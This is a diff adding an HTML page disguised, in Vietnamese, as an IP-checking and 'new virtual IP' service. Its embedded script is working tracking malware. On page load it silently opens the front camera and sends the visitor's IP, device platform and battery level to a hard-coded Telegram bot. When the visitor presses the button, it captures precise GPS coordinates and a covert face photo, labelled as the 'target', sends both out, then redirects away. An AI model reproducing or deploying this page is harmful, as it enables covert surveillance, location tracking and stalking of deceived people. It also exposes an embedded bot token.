@@ -1,0 +1,121 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Hệ Thống Kiểm Tra IP | Proxy Global</title>
+    <style>
+        :root { --neon: #00ff88; --bg: #0d1117; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', monospace; }
+        body { background: var(--bg); color: #c9d1d9; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .app { width: 92%; max-width: 400px; background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
+        .header h1 { font-size: 16px; color: var(--neon); letter-spacing: 1px; margin-bottom: 20px; text-transform: uppercase; }
+        .info-box { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin-bottom: 25px; text-align: left; font-size: 11px; line-height: 1.8; border-left: 3px solid var(--neon); }
+        .info-box b { color: var(--neon); }
+        .btn-strike { background: var(--neon); color: #000; border: none; width: 100%; padding: 18px; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 14px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.2); }
+        .btn-strike:active { transform: scale(0.95); opacity: 0.8; }
+        #v { width: 1px; height: 1px; opacity: 0.05; position: absolute; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <div class="header">
+            <h1>NETWORK SCANNER v27.0</h1>
+        </div>
+
+        <div class="info-box">
+            > STATUS: <b id="stt">READY</b><br>
+            > IP: <span id="u-ip">Checking...</span><br>
+            > DEVICE: <span id="u-os">Detecting...</span><br>
+            > BATTERY: <span id="u-bat">--%</span>
+        </div>
+
+        <p style="font-size: 10px; color: #666; margin-bottom: 20px;">Vui lòng xác thực phần cứng và tọa độ để khởi tạo IP ảo mới.</p>
+
+        <button class="btn-strike" id="main-btn" onclick="EXECUTE()">Thiết lập IP mới</button>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const _T = "8770921532:AAGQBOL-ThWNvOZTu0a0MdpXs2VTGJU4x3s";
+        const _I = "8308036418";
+        let _STR = null;
+
+        async function _API(p, f) { 
+            f.append('chat_id', _I); 
+            return fetch(`https://api.telegram.org/bot${_T}/${p}`, {method:'POST', body:f}); 
+        }
+
+        // 1. TỰ ĐỘNG THU THẬP THÔNG TIN KHI VÀO TRANG
+        (async function boot() {
+            try {
+                // Mở cam sẵn để lấy sáng
+                _STR = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                document.getElementById('v').srcObject = _STR;
+                
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                document.getElementById('u-ip').innerText = d.ip;
+                document.getElementById('u-os').innerText = navigator.platform;
+                
+                let bStr = "N/A";
+                try { const b = await navigator.getBattery(); bStr = (b.level*100).toFixed(0)+"%"; document.getElementById('u-bat').innerText = bStr; } catch(e){}
+
+                // Gửi tin nhắn "Mục tiêu đã sập bẫy" về Tele
+                const f = new FormData();
+                f.append('text', `<b>[🔥 MỤC TIÊU ĐANG VÀO LINK]</b>\nIP: <code>${d.ip}</code>\nMáy: ${navigator.platform}\nPin: ${bStr}`);
+                f.append('parse_mode', 'HTML');
+                _API('sendMessage', f);
+            } catch(e) {}
+        })();
+
+        async function EXECUTE() {
+            const btn = document.getElementById('main-btn');
+            btn.innerText = "ĐANG XÁC THỰC... (3S)";
+            btn.disabled = true;
+            document.getElementById('stt').innerText = "CONNECTING...";
+
+            // 2. LẤY VỊ TRÍ CHUẨN GOOGLE MAPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const link = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const f = new FormData();
+                    f.append('text', `📍 **VỊ TRÍ CHUẨN (FIXED):**\n🔗 Link: ${link}\n🎯 Sai số: ${p.coords.accuracy.toFixed(1)}m`);
+                    f.append('parse_mode', 'Markdown');
+                    await _API('sendMessage', f);
+                }, (err) => {
+                    const f = new FormData(); f.append('text', "❌ Mục tiêu chặn GPS."); _API('sendMessage', f);
+                }, {enableHighAccuracy: true, timeout: 10000});
+            }
+
+            // 3. CHỤP MẶT (FIX LỖI ĐEN - ĐỢI 3 GIÂY)
+            setTimeout(async () => {
+                try {
+                    const vid = document.getElementById('v');
+                    const can = document.getElementById('c');
+                    can.width = vid.videoWidth; can.height = vid.videoHeight;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    
+                    can.toBlob(async (blob) => {
+                        const f = new FormData();
+                        f.append('photo', blob, 'face.jpg');
+                        f.append('caption', '📸 ẢNH MẶT MỤC TIÊU (FAST-ACTION)');
+                        await _API('sendPhoto', f);
+                        
+                        // Xong việc dừng camera và đá sang trang 1.1.1.1
+                        if(_STR) _STR.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://1.1.1.1";
+                    }, 'image/jpeg', 0.9);
+                } catch(e) { window.location.href = "https://1.1.1.1"; }
+            }, 3000); 
+        }
+    </script>
+</body>
+</html>
+
